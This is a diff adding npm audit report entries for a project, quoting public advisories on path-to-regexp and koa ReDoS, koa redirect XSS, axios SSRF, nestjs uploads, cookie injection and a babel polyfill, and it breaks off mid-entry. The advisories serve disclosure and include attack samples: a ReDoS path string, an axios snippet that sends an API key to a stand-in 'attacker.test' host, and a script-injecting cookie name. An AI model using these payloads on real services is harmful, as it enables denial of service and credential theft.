+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j\n- https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f\n- https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45296\n- https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485\n- https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef\n- https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894\n- https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0\n- https://security.netapp.com/advisory/ntap-20250124-0001\n- https://github.com/advisories/GHSA-9wv6-86v2-598j",
+      "created": "2024-09-09T20:19:15.000Z",
+      "id": 1101846,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",
+      "reported_by": null,
+      "title": "path-to-regexp outputs backtracking regular expressions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-45296"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": ">=4.0.0 <6.3.0",
+      "github_advisory_id": "GHSA-9wv6-86v2-598j",
+      "recommendation": "Upgrade to version 6.3.0 or later",
+      "patched_versions": ">=6.3.0",
+      "updated": "2025-01-24T21:32:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-9wv6-86v2-598j"
+    },
+    "1101848": {
+      "findings": [
+        {
+          "version": "3.2.0",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/core>path-to-regexp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j\n- https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f\n- https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45296\n- https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485\n- https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef\n- https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894\n- https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0\n- https://security.netapp.com/advisory/ntap-20250124-0001\n- https://github.com/advisories/GHSA-9wv6-86v2-598j",
+      "created": "2024-09-09T20:19:15.000Z",
+      "id": 1101848,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",
+      "reported_by": null,
+      "title": "path-to-regexp outputs backtracking regular expressions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-45296"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": ">=2.0.0 <3.3.0",
+      "github_advisory_id": "GHSA-9wv6-86v2-598j",
+      "recommendation": "Upgrade to version 3.3.0 or later",
+      "patched_versions": ">=3.3.0",
+      "updated": "2025-01-24T21:32:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-9wv6-86v2-598j"
+    },
+    "1101849": {
+      "findings": [
+        {
+          "version": "1.8.0",
+          "paths": [
+            "packages__lone-star-platform>@types/koa-route>path-to-regexp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j\n- https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f\n- https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45296\n- https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485\n- https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef\n- https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894\n- https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0\n- https://security.netapp.com/advisory/ntap-20250124-0001\n- https://github.com/advisories/GHSA-9wv6-86v2-598j",
+      "created": "2024-09-09T20:19:15.000Z",
+      "id": 1101849,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",
+      "reported_by": null,
+      "title": "path-to-regexp outputs backtracking regular expressions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-45296"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": ">=0.2.0 <1.9.0",
+      "github_advisory_id": "GHSA-9wv6-86v2-598j",
+      "recommendation": "Upgrade to version 1.9.0 or later",
+      "patched_versions": ">=1.9.0",
+      "updated": "2025-01-24T21:32:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-9wv6-86v2-598j"
+    },
+    "1101850": {
+      "findings": [
+        {
+          "version": "0.1.7",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>path-to-regexp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j\n- https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f\n- https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45296\n- https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485\n- https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef\n- https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894\n- https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0\n- https://security.netapp.com/advisory/ntap-20250124-0001\n- https://github.com/advisories/GHSA-9wv6-86v2-598j",
+      "created": "2024-09-09T20:19:15.000Z",
+      "id": 1101850,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",
+      "reported_by": null,
+      "title": "path-to-regexp outputs backtracking regular expressions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-45296"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": "<0.1.10",
+      "github_advisory_id": "GHSA-9wv6-86v2-598j",
+      "recommendation": "Upgrade to version 0.1.10 or later",
+      "patched_versions": ">=0.1.10",
+      "updated": "2025-01-24T21:32:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-9wv6-86v2-598j"
+    },
+    "1102314": {
+      "findings": [
+        {
+          "version": "2.15.3",
+          "paths": [
+            "packages__lone-star-platform>koa"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-25200\n- https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c\n- https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32\n- https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08\n- https://github.com/koajs/koa/releases/tag/2.15.4\n- https://github.com/advisories/GHSA-593f-38f6-jp5m",
+      "created": "2025-02-12T19:23:09.000Z",
+      "id": 1102314,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nKoa uses an evil regex to parse the `X-Forwarded-Proto` and `X-Forwarded-Host` HTTP headers. This can be exploited to carry out a Denial-of-Service attack.\n\n### PoC\n\nComing soon.\n\n### Impact\nThis is a Regex Denial-of-Service attack and causes memory exhaustion. The regex should be improved and empty values should not be allowed.",
+      "reported_by": null,
+      "title": "Inefficient Regular Expression Complexity in koa",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-25200"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "koa",
+      "vulnerable_versions": ">=2.0.0 <2.15.4",
+      "github_advisory_id": "GHSA-593f-38f6-jp5m",
+      "recommendation": "Upgrade to version 2.15.4 or later",
+      "patched_versions": ">=2.15.4",
+      "updated": "2025-02-12T19:23:12.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-593f-38f6-jp5m"
+    },
+    "1103618": {
+      "findings": [
+        {
+          "version": "1.7.7",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>axios"
+          ]
+        },
+        {
+          "version": "1.7.4",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>axios"
+          ]
+        },
+        {
+          "version": "1.7.5",
+          "paths": [
+            "packages__lone-star-platform>axios"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6\n- https://github.com/axios/axios/issues/6463\n- https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f\n- https://github.com/axios/axios/releases/tag/v1.8.2\n- https://nvd.nist.gov/vuln/detail/CVE-2025-27152\n- https://github.com/axios/axios/pull/6829\n- https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde\n- https://github.com/advisories/GHSA-jr5f-v2jv-69x6",
+      "created": "2025-03-07T15:16:00.000Z",
+      "id": 1103618,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\nReference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",
+      "reported_by": null,
+      "title": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-27152"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "axios",
+      "vulnerable_versions": ">=1.0.0 <1.8.2",
+      "github_advisory_id": "GHSA-jr5f-v2jv-69x6",
+      "recommendation": "Upgrade to version 1.8.2 or later",
+      "patched_versions": ">=1.8.2",
+      "updated": "2025-03-28T14:57:53.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6"
+    },
+    "1103877": {
+      "findings": [
+        {
+          "version": "2.15.3",
+          "paths": [
+            "packages__lone-star-platform>koa"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v\n- https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32379\n- https://github.com/advisories/GHSA-x2rg-q646-7m2v",
+      "created": "2025-04-09T13:00:07.000Z",
+      "id": 1103877,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nIn koa < 2.16.1 and < 3.0.0-alpha.5, passing untrusted user input to ctx.redirect() even after sanitizing it, may execute javascript code on the user who use the app.\n\n### Patches\nThis issue is patched in  2.16.1 and 3.0.0-alpha.5.\n\n### PoC\nComing soon...\n\n### Impact\n1. Redirect user to another phishing site\n2. Make request to another endpoint of the application based on user's cookie\n3. Steal user's cookie",
+      "reported_by": null,
+      "title": "Koajs vulnerable to Cross-Site Scripting (XSS) at ctx.redirect() function",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-32379"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "koa",
+      "vulnerable_versions": "<2.16.1",
+      "github_advisory_id": "GHSA-x2rg-q646-7m2v",
+      "recommendation": "Upgrade to version 2.16.1 or later",
+      "patched_versions": ">=2.16.1",
+      "updated": "2025-04-09T20:29:45.000Z",
+      "cvss": {
+        "score": 5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-x2rg-q646-7m2v"
+    },
+    "1103903": {
+      "findings": [
+        {
+          "version": "10.4.1",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/common"
+          ]
+        },
+        {
+          "version": "10.3.0",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>@nestjs/common"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-29409\n- https://github.com/nestjs/nest/issues/13311#issuecomment-1993839495\n- https://gist.github.com/aydinnyunus/801342361584d1491c67a820a714f53f\n- https://github.com/nestjs/nest/blob/83a48b2c7396985144b7a6cd5d3bee1abb7c5d81/packages/common/pipes/file/file-type.validator.ts#L19\n- https://github.com/nestjs/nest/issues/14876\n- https://github.com/nestjs/nest/issues/14876#issuecomment-2796888038\n- https://github.com/nestjs/nest/pull/14881\n- https://github.com/nestjs/nest/releases/tag/v11.0.16\n- https://github.com/nestjs/nest/releases/tag/v10.4.16\n- https://github.com/advisories/GHSA-cj7v-w2c7-cp7c",
+      "created": "2025-03-14T18:30:51.000Z",
+      "id": 1103903,
+      "npm_advisory_id": null,
+      "overview": "File Upload vulnerability in nestjs nest prior to v.11.0.16 allows a remote attacker to execute arbitrary code via the Content-Type header.",
+      "reported_by": null,
+      "title": "nest allows a remote attacker to execute arbitrary code via the Content-Type header",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-29409"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@nestjs/common",
+      "vulnerable_versions": "<10.4.16",
+      "github_advisory_id": "GHSA-cj7v-w2c7-cp7c",
+      "recommendation": "Upgrade to version 10.4.16 or later",
+      "patched_versions": ">=10.4.16",
+      "updated": "2025-04-14T22:25:20.000Z",
+      "cvss": {
+        "score": 5.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-cj7v-w2c7-cp7c"
+    },
+    "1103907": {
+      "findings": [
+        {
+          "version": "0.6.0",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>cookie"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\n- https://github.com/jshttp/cookie/pull/167\n- https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\n- https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "created": "2024-10-04T20:31:00.000Z",
+      "id": 1103907,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "reported_by": null,
+      "title": "cookie accepts cookie name, path, and domain with out of bounds characters",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47764"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "cookie",
+      "vulnerable_versions": "<0.7.0",
+      "github_advisory_id": "GHSA-pxg6-pf52-xh8x",
+      "recommendation": "Upgrade to version 0.7.0 or later",
+      "patched_versions": ">=0.7.0",
+      "updated": "2025-04-15T13:56:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+    },
+    "1104000": {
+      "findings": [
+        {
+          "version": "7.25.4",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>concurrently>date-fns>@babel/runtime"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\n- https://github.com/babel/babel/pull/17173\n- https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-27789\n- https://github.com/advisories/GHSA-968p-4wvh-cqc8",
+      "created": "2025-03-11T20:30:18.000Z",
+      "id": 1104000,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing 